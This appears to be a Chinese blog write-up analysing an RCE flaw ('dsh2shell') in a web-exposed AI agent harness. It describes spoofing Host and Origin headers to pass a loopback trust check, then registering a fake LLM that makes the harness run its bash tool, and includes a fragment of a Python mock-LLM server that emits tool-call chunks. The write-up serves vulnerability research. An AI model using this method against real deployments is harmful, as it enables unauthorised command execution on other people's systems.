发表于 2026-11-02 更新于 2026-11-03 阅读次数： 本文字数： 29k 阅读时长 ≈ 52 分钟

dsh2shell

起因是突发奇想，有没有什么AI产品是不集成在其他服务中能被独立攻击到的呢?

然后就发现Deepseek harness 在最开始是Web UI，那么也就有从公网上被攻击的风险(不是到底是谁在部署到公网…)

再信息收集下发现有个dsh2shell的漏洞，但是看了眼poc写的有点一言难尽吧，AI slop出来的也不好自己patch，所以打算研究原理自己重新写一版

TL;DR

这个洞通过伪造Host过信任校验，接着再在dsh上注册一个恶意的LLM，创建full-access会话，并通过它去调用Harness的原生tools来执行命令

How dsh2shell RCE?

首先回归源码

fake loopback

先看到最外层的检验deepseek-harness-dsh-v0.1.1-rc.2\packages\client\connection\src\api-request-trust.ts

可以看到这里有两个变量完全由用户控制

host和origin(分别取自Request的Host头和Origin头)

接着会对host进行解析，检查hostname是否为回环地址，hostUrl是否在受信任的域名下，任意满意其中一个条件就短路

再进行sec-fetch-site值的校验，只能为cross-site

最后检验Origin的host是否和host一致

只检查报文不检查连接IP吗，那只能畅通无阻了

但是看注释也会发现，这里本来就只是用来防御来自浏览器层的攻击的，不是认证层。本来设计出来就是让你 webserver 只绑回环地址的

过了isTrustedApiRequest看看 能应用在哪里

发现过了权限其实就随便搞了(特权路由都有了还怕不能调用普通路由吗)，到这里其实就算直接接管dsh本体了

接着诱导Harness调用原生的bash工具就行，可能有人会疑问，为什么是Harness去调用bash工具呢?不是AI去调用吗

这里简单的讲点题外话吧，AI Agent其实是LLM+Harness+一些其他的东西(具体的我忘记了，可以将其看做一台电脑，LLM就是CPU，负责核心的工作(计算推理)，而Harness则是操作系统，负责嵌合用户与LLM之间的交互，同时也执行LLM传递的指令，保证其执行环境

那么其实也不难看出，当我们通过外层的限制接管AI Agent时，其实有时候不需要对LLM进行污染/注入，反而只要突破Harness层，假装成内部的LLM诱导Harness去执行就可以直接进行高危操作了

        "id": "mock", "object": "chat.completion.chunk",
        "created": int(time.time()), "model": "mock-model",
    }

    if tool_call:
        c1 = {**base, "choices": [{
            "index": 0,
            "delta": {"tool_calls": [{
                "index": 0,
                "id": tool_call["id"],
                "type": "function",
                "function": {
                    "name": tool_call["name"],
                    "arguments": tool_call["arguments"],
                },
            }]},
            "finish_reason": None,
        }]}
        chunks.append(c1)
        finish = "tool_calls"

    elif text:
        c1 = {**base, "choices": [{
            "index": 0,
            "delta": {"content": text},
            "finish_reason": None,
        }]}
        chunks.append(c1)
        finish = "stop"

    c_end = {**base, "choices": [{
        "index": 0,
        "delta": {},
        "finish_reason": finish,
    }]}
    chunks.append(c_end)

    body = "".join(
        f"data: {json.dumps(c, ensure_ascii=False)}\n\n" for c in chunks
    ) + "data: [DONE]\n\n"
    return body.encode("utf-8")

        n = int(self.headers.get("content-length", 0) or 0)
